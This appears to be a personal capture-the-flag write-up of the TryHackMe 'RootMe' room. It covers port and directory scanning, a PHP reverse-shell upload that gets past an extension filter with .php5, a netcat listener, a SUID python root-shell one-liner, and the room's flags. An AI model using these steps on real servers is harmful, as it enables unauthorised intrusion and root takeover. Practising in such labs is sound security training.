---
tags:
  - Linux
  - tryhackme
---
Target is:  (Given)
# Recon
nmap 10.10.203.220 --top-ports 4000 -T5  --open -oN openPorts.txt
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http

nmap -sC -sV 10.10.203.220 -p22,80 -T5 --open -oN rootMe-nmap-run1.txt 
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
	|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
	|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-title: HackIT - Home
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

time to look for a hidden directory

dirb 10.10.203.220
	-----------------
	DIRB v2.22    
	By The Dark Raver
	-----------------
	
	START_TIME: Tue Oct 31 00:44:28 2023
	URL_BASE: http://10.10.203.220/
	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
	
	-----------------
	
	                                                                            GENERATED WORDS: 4612
	
	---- Scanning URL: http://10.10.203.220/ ----
	                                                                                                                                                        ==> DIRECTORY: http://10.10.203.220/css/
	+ http://10.10.203.220/index.php (CODE:200|SIZE:616)                       
	                                                                            ==> DIRECTORY: http://10.10.203.220/js/
	                                                                            ==> DIRECTORY: http://10.10.203.220/panel/

dirbuster
![[Pasted image 20231031025002.png]]

Now onto the site which is a file upload site
![[Pasted image 20231031025251.png]]

Let's try to upload a web server reverse shell
Revshells.com

hostname -I
	10.18.39.123

Prep the listener
	nc -nlvp 4444

![[Pasted image 20231031030009.png]]

.php is not allowed
	try the alts
		**.php3, .php4, .php5, .php7, .pthml, .pht.**


php5 works
![[Pasted image 20231031030331.png]]


# Access
![[Pasted image 20231031030436.png]]

File exploring
	www-data@rootme:/var/www$ cat user.txt
	cat user.txt
	THM{y0u_g0t_a_sh3ll}


# Priv Esc
www-data@rootme:/var/www$ find / -perm -u=s -type f 2>/dev/null
	find / -perm -u=s -type f 2>/dev/null
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/lib/snapd/snap-confine
	/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/openssh/ssh-keysign
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/bin/traceroute6.iputils
	/usr/bin/newuidmap
	/usr/bin/newgidmap
	/usr/bin/chsh
	**/usr/bin/python**
	/usr/bin/at
	/usr/bin/chfn
	/usr/bin/gpasswd
	/usr/bin/sudo
	/usr/bin/newgrp
	/usr/bin/passwd
	/usr/bin/pkexec
	/snap/core/8268/bin/mount
	/snap/core/8268/bin/ping
	/snap/core/8268/bin/ping6
	/snap/core/8268/bin/su
	/snap/core/8268/bin/umount
	/snap/core/8268/usr/bin/chfn
	/snap/core/8268/usr/bin/chsh
	/snap/core/8268/usr/bin/gpasswd
	/snap/core/8268/usr/bin/newgrp
	/snap/core/8268/usr/bin/passwd
	/snap/core/8268/usr/bin/sudo
	/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/snap/core/8268/usr/lib/openssh/ssh-keysign
	/snap/core/8268/usr/lib/snapd/snap-confine
	/snap/core/8268/usr/sbin/pppd
	/snap/core/9665/bin/mount
	/snap/core/9665/bin/ping
	/snap/core/9665/bin/ping6
	/snap/core/9665/bin/su
	/snap/core/9665/bin/umount
	/snap/core/9665/usr/bin/chfn
	/snap/core/9665/usr/bin/chsh
	/snap/core/9665/usr/bin/gpasswd
	/snap/core/9665/usr/bin/newgrp
	/snap/core/9665/usr/bin/passwd
	/snap/core/9665/usr/bin/sudo
	/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/snap/core/9665/usr/lib/openssh/ssh-keysign
	/snap/core/9665/usr/lib/snapd/snap-confine
	/snap/core/9665/usr/sbin/pppd
	/bin/mount
	/bin/su
	/bin/fusermount
	/bin/ping
	/bin/umount

Python exists which is great

https://gtfobins.github.io/gtfobins/python/#suid

Basically run this command
	**python -c 'import os; os.execl("/bin/sh", "sh", "-p")'**

![[Pasted image 20231031031534.png]]

cat root.txt
	THM{pr1v1l3g3_3sc4l4t10n}

Boot2Root